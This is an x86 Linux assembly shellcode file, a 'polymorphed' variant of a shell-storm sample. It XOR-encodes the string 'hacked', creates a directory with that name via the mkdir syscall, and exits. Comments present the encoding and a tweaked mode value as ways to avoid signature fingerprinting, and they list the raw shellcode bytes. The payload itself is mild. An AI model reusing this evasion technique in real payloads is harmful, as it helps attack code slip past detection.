; Polymorphed version of shellcode-542.php from shell-storm
; Author: Danijel Ilisin / @dab00ze
; http://dilsec.com
;
; XOR'ing the all-too-obvious "hacked" string and some more minor chnages 
;
; new shellcode: "\xeb\x23\x5e\x31\xc0\x31\xc9\x89\xf7\xb1\x07\x80\x36\xbf\x46\xe2"
;                "\xfa\x89\xfe\xb0\x27\x8d\x1e\x66\xb9\xec\x01\x66\x41\xcd\x80\xb0"
;               "\x01\x31\xdb\xcd\x80\xe8\xd8\xff\xff\xff\xd7\xde\xdc\xd4\xda\xdb
;               "\xbf"
;
; that's 49 bytes (136% size of the original shellcode)

global _start			

section .text
_start:

        jmp short _call_shellcode

_shellcode:
        pop esi
        xor eax,eax
        xor ecx, ecx
        mov edi, esi                ; save string ptr

; decrypt string with simple xor

        mov cl, 7 
_loop:
        xor byte [esi], 0xbf
        inc esi        
        loop _loop
        
        mov esi, edi 
        mov al,0x27                 ; syscall: mkdir

;  int mkdir(const char *pathname, mode_t mode);

        lea ebx,[esi]               ; string 'hacked'
        mov cx,0x1ec                ; mode: 755 (octal)
        inc cx                      ; avoid fingerprinting 755 octal
        int 0x80                    ; trigger syscall
        
        mov al,0x1
        xor ebx,ebx
        int 0x80                    ; exit with rc 0
        
_call_shellcode:
        call dword _shellcode

_string:  db 0xd7, 0xde, 0xdc, 0xd4, 0xda, 0xdb, 0xbf   ; 'hacked' ^ 0xbf 

